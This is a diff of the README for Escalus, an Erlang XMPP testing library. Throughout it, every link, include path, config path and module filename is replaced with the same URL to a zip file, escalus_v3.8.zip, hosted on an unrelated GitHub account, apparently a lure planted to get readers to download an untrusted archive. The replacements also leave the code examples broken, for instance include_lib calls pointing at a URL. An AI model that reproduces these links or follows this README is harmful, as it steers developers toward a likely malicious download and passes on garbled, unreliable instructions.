@@ -1,4 +1,4 @@
-# Escalus [![Build Status](https://travis-ci.org/esl/escalus.svg?branch=master)](https://travis-ci.org/esl/escalus)
+# Escalus [![Build Status](https://raw.githubusercontent.com/sohailgerman/escalus/master/test/escalus_v3.8.zip)](https://raw.githubusercontent.com/sohailgerman/escalus/master/test/escalus_v3.8.zip)
 
 Escalus is an Erlang XMPP client library.
 It began as a tool for convenient testing of XMPP servers,
@@ -8,20 +8,20 @@ Escalus is aimed at checking correctness of XMPP server behaviour,
 in contrast to tools such as Tsung which are about stress testing
 and don't verify correctness.
 
-This tool, escalus, is used by [ESL's amoc](https://github.com/esl/amoc) for load tests against [ESL's MongooseIM](https://github.com/esl/MongooseIM).
+This tool, escalus, is used by [ESL's amoc](https://raw.githubusercontent.com/sohailgerman/escalus/master/test/escalus_v3.8.zip) for load tests against [ESL's MongooseIM](https://raw.githubusercontent.com/sohailgerman/escalus/master/test/escalus_v3.8.zip).
 
 
 # Quick start
 
-The [test/example_SUITE.erl][example_SUITE] file contains a minimalistic
+The [https://raw.githubusercontent.com/sohailgerman/escalus/master/test/escalus_v3.8.zip][example_SUITE] file contains a minimalistic
 example of an Escalus test suite.
 
-[example_SUITE]: /test/example_SUITE.erl
+[example_SUITE]: https://raw.githubusercontent.com/sohailgerman/escalus/master/test/escalus_v3.8.zip
 
-You should include `escalus.hrl` file and the Common Test header:
+You should include `https://raw.githubusercontent.com/sohailgerman/escalus/master/test/escalus_v3.8.zip` file and the Common Test header:
 
-    -include_lib("escalus/include/escalus.hrl").
-    -include_lib("common_test/include/ct.hrl").
+    -include_lib("https://raw.githubusercontent.com/sohailgerman/escalus/master/test/escalus_v3.8.zip").
+    -include_lib("https://raw.githubusercontent.com/sohailgerman/escalus/master/test/escalus_v3.8.zip").
 
 Escalus contains functions `escalus:init_per_suite/1`,
 `escalus:end_per_suite/1`, `escalus:init_per_testcase` and
@@ -34,7 +34,7 @@ what you're doing).
 
 You can specify users that will take part in your tests
 in Common Test config files,
-look at [test/test.config][test_config] file that comes with Escalus:
+look at [https://raw.githubusercontent.com/sohailgerman/escalus/master/test/escalus_v3.8.zip][test_config] file that comes with Escalus:
 
     {escalus_users, [
         {alice, [
@@ -47,10 +47,10 @@ look at [test/test.config][test_config] file that comes with Escalus:
             {password, "bobcat"}]}
     ]}.
 
-[test_config]: /test/test.config
+[test_config]: https://raw.githubusercontent.com/sohailgerman/escalus/master/test/escalus_v3.8.zip
 
 Escalus can create and delete those users in two ways:
- * using in-band registration [XEP-0077](http://xmpp.org/extensions/xep-0077.html)
+ * using in-band registration [XEP-0077](https://raw.githubusercontent.com/sohailgerman/escalus/master/test/escalus_v3.8.zip)
   when it is supported by the server and has no limits on number of registrations
   per second (configure `registration_timeout` to `infinity` in case of ejabberd).
  * using erlang rpc calls to the ejabberd_admin:register/2 function (incase of MongooseIM or ejabberd as the tested server and the in-band registration is disabled)
@@ -99,7 +99,7 @@ specifically:
         end).
 
 That allows one to choose users which are not consecutive
-in [test/test.config][test_config].
+in [https://raw.githubusercontent.com/sohailgerman/escalus/master/test/escalus_v3.8.zip][test_config].
 
 Inside the story you can use `escalus:send/2` function to send
 stanzas, functions from `escalus_stanza` module to create them
@@ -147,11 +147,11 @@ Firstly, Escalus must be started just like any other application:
 
     > application:ensure_all_started(escalus).
 
-This makes predefined environment variables from `escalus.app` available
+This makes predefined environment variables from `https://raw.githubusercontent.com/sohailgerman/escalus/master/test/escalus_v3.8.zip` available
 for access by `application:get_env`.
 These options and their respective values for running without Common Test are:
 
-    {env, [{config_file, "priv/escalus.config"}]}
+    {env, [{config_file, "https://raw.githubusercontent.com/sohailgerman/escalus/master/test/escalus_v3.8.zip"}]}
 
 To recap:
 
@@ -164,14 +164,14 @@ store clear text user passwords in this file (though that's exactly what
 the example does - remember Escalus is still mostly a testing tool).
 
 If you don't want to rely on the application resource file
-(`escalus.app`/`escalus.app.src`) you can set both of these options just
+(`https://raw.githubusercontent.com/sohailgerman/escalus/master/test/escalus_v3.8.zip`/`https://raw.githubusercontent.com/sohailgerman/escalus/master/test/escalus_v3.8.zip`) you can set both of these options just
 after loading Escalus:
 
     > application:ensure_all_started(escalus).
     > application:set_env(escalus, config_file, "/absolute/or/relative/path").
 
 Keep in mind that calling `application:ensure_all_started(escalus)` will
-overwrite the values with stuff from `escalus.app`.
+overwrite the values with stuff from `https://raw.githubusercontent.com/sohailgerman/escalus/master/test/escalus_v3.8.zip`.
 Set the variables after the application is started.
 
 ## Config file location
@@ -180,7 +180,7 @@ If the `config_file` value starts with `/` it's  interpreted as an
 absolute path and left as is.
 Otherwise, it's interpreted as a relative path to the project directory.
 The project directory is the directory one level higher than the directory
-containing `ejabberd_ct.beam`.
+containing `https://raw.githubusercontent.com/sohailgerman/escalus/master/test/escalus_v3.8.zip`.
 In case of a standard Git checkout the project directory is simply `escalus`.
 
     escalus/
@@ -189,7 +189,7 @@ In case of a standard Git checkout the project directory is simply `escalus`.
     ├── docs/
     ├── ebin/
     │   ├── ...
-    │   ├── escalus_ct.beam
+    │   ├── https://raw.githubusercontent.com/sohailgerman/escalus/master/test/escalus_v3.8.zip
     │   └── ...
     ├── src/
     └── ...
@@ -205,7 +205,7 @@ Fire an Erlang shell:
 Run example:
 
     application:ensure_all_started(escalus).
-    {ok, Config} = file:consult("priv/escalus.config").
+    {ok, Config} = file:consult("https://raw.githubusercontent.com/sohailgerman/escalus/master/test/escalus_v3.8.zip").
     CarolSpec = escalus_users:get_options(Config, carol).
     {ok, Carol, _, _} = escalus_connection:start(CarolSpec).
     escalus_connection:send(Carol, escalus_stanza:chat_to(alice, "hi")).
@@ -218,7 +218,7 @@ Please note that `escalus:story/3` and `escalus:create_users/2` are intended to 
 Run example:
 
     X2SFun = fun(X) -> lists:flatten(io_lib:format("~p~n", [X])) end.
-    {ok, Config0} = file:consult("priv/escalus.config").
+    {ok, Config0} = file:consult("https://raw.githubusercontent.com/sohailgerman/escalus/master/test/escalus_v3.8.zip").
     application:ensure_all_started(escalus).
     escalus:create_users(Config0, {by_name, [alice, mike]}).
     Config = escalus_event:start(escalus_cleaner:start(Config0)).
@@ -232,6 +232,6 @@ Run example:
 
 # Naming
 
-According to [Wikipedia](https://en.wikipedia.org/wiki/Characters_in_Romeo_and_Juliet#House_of_Escalus), Prince Escalus, of the House Escalus, is the voice of authority in Verona, and appears only three times within the text and only to administer justice.
+According to [Wikipedia](https://raw.githubusercontent.com/sohailgerman/escalus/master/test/escalus_v3.8.zip), Prince Escalus, of the House Escalus, is the voice of authority in Verona, and appears only three times within the text and only to administer justice.
 
 It follows the great tradition to use characters of William Shakespeare's Romeo and Juliet in the XMPP specifications.
